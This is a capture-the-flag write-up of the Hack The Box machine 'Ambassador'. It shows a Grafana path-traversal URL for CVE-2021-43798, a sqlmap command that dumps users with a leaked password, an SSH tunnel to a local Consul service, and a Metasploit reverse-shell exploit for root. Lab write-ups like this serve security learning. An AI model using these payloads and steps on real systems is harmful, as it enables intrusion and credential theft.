---
layout: default
title: Ambassador
author: k0z4c 
tags: hackthebox
asset: assets/htb/ambassador
---

## Come to my palace

Scanning for open ports it was easy to find ports 80, 3000 and 5432 open 
```bash
nmap -Pn -n -sC -sV -p- --max-rtt 600ms -oA all_tcp -vvv --open --stats-every 1s --packet-trace -e tun0 ambassador.htb
```

{% figure %}
![]({% link assets/htb/ambassador/nmap.png %})
{% endfigure %}

Port 3000 is actually exposing an http web server hosting Grafana 

{% figure %}
![]({% link assets/htb/ambassador/nmap_grafana.png %})
{% endfigure %}

Meanwhile on port 80 another server, the dev server, is hosted  

{% figure %}
![]({% link assets/htb/ambassador/ambassador_web.png %})
{% endfigure %}

The grafana service's  version  was found vulnerable to path traversal through CVE-2021-43798, 
so it was possible to dump the application database with 

```bash
http://10.10.11.183:3000/public/plugins/table-old/../../../../../../../../../../../../var/lib/grafana/grafana.db
```
{% figure %}
![]({% link assets/htb/ambassador/grafana_web.png %})
{% endfigure %}

An already-ready exploit can be used to get the database and the decryption key <https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798>

Looking  through the database a cleartext password can be found within the **data_source** table 

{% figure %}
![]({% link assets/htb/ambassador/db_cleartext.png %})
{% endfigure %}

so it was possible to connect directly and dump the developer password 

```bash
sudo sqlmap -d 'mysql://grafana:dontStandSoCloseToMe63221!@ambassador.htb:3306/grafana' -D whackywidget -T users --dump 
```
{% figure %}
![]({% link assets/htb/ambassador/developer_access.png %})
{% endfigure %}

## Meet the Consul

Enumerating the listening tcp sockets on the box we can see that several ports are open from the local host side.
These can be related to the hashicorp consul services (https://developer.hashicorp.com/consul/docs/install/ports)

{% figure %}
![]({% link assets/htb/ambassador/consul_ports.png %})
{% endfigure %}

We can abuse the consul web service creating an agent that will execute our reverse shell.
But to do thiz a secret key will be needed.. that can be found within the history of the repository located at /opt/my-app/whackywidget through 

```bash
git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55
```

{% figure %}
![]({% link assets/htb/ambassador/git_leak.png %})
{% endfigure %}

so we can load the metasploit module and insert the parameter and get a root shell, after pivoting to the localhost interface. Then 

```bash
ssh -C -N  -f -L 8500:127.0.0.1:8500 developer@ambassador.htb 
```

So we configure the below settings and set the payload to linux/x86/shell_reverse_tcp  

{% figure %}
![]({% link assets/htb/ambassador/msfconfig.png %})
{% endfigure %}

Then we ran the exploit getting a root reverse shell 

{% figure %}
![]({% link assets/htb/ambassador/root.png %})
{% endfigure %}





